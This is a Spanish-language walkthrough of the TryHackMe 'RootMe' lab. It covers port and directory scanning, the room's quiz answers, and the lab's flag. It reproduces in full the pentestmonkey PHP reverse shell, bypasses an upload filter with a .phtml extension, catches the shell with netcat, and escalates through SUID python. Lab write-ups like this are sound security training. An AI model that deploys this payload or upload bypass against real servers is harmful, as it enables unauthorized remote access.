Empezamos con la fase de reconocimiento:

``` bash
❯ sudo nmap -p- -Pn --min-rate 5000 10.10.31.200
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 16:57 CEST
Nmap scan report for 10.10.31.200
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 13.71 seconds
```

con esto ya podemos responder la primera pregunta de tryhackme:

**Scan the machine, how many ports are open?**
Respuesta: **2**

ecaneamos los servicios de los puertos en mas profundidad con nmap:

``` bash
❯ nmap -p22,80 -sCV 10.10.181.31
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-13 18:24 CEST
Nmap scan report for 10.10.181.31
Host is up (0.064s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: HackIT - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.02 seconds
```

y con este escaner contestamos mas preguntas de tryhackme:

**What version of Apache is running?** 
Respuesta: **2.4.29**
**What service is running on port 22?** 
Respuesta: **ssh**

hacemos una enumeracion de directorios con gobuster en el servicio http:

```bash
❯ gobuster dir -u http://10.10.181.31 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.181.31
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.181.31/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.181.31/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.181.31/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.181.31/panel/]
Progress: 30428 / 220561 (13.80%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 30478 / 220561 (13.82%)
===============================================================
Finished
===============================================================
```

obtenemos los directorios de :
/upload
/panel

este ultimo es la respuesta a la siguiente pregunta:

**What is the hidden directory?**
Respuesta: **/panel/**

en este directorio encontramos una funcionalidad para subir archivos por lo que vamos a intentar si subiendo una reverse shell en php nos lo interpreta:

![[/img/uploadRootMe.png|uploadRootMe.png]]

una herramienta para obtener una reverse shell es [revshells](https://www.revshells.com/):

utilizamos la opcion de la reverse shell de pentestMonkey:

```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = 'IP TARGET';
$port = NUM_PUERTO;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

cambiamos la ip target y num puerto para decuarlo a nuestro caso, con nano creamos el archivo php y lo subimos a la web:


![[uploadFailrootme.png]]

no lo tendremos tan facil, intentaremos cambiar la extension php a ver si alguna cuela:
en el directorio uploads vemos nuestras subidas:

![[/img/Shellrootme.png|Shellrootme.png]]

tras unos intentos en mi caso me funciono la subida con la extension .phtml
nos ponemos a la escucha en net cat y clickamos la shell subida.

Con esto obtenemos acceso:
```bash
❯ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.9.251.231] from (UNKNOWN) [10.10.181.31] 45778
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 16:52:21 up 30 min,  0 users,  load average: 0.00, 0.00, 0.18
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: cant access tty; job control turned off
$ 
$ whoami
www-data
$ hostname
rootme
$ 
```

hacemos una busqueda a los permisos SUID y encontramos que tenemos SUID para el binario python:
vamos a la web de gtfobins para ver como elevar los privilegios y aplicamos el metodo:

![[/img/privrootme.png|privrootme.png]]

con esto obtenemos root.

por ultimo buscamos el archivo user.txt en el sistema y lo visualizamos para contestar a la ultima pregunta de tryhackme:
![[/img/flagrootme.png|flagrootme.png]]

**user.txt**
Respuesta: **THM{y0u_g0t_a_sh3ll}**

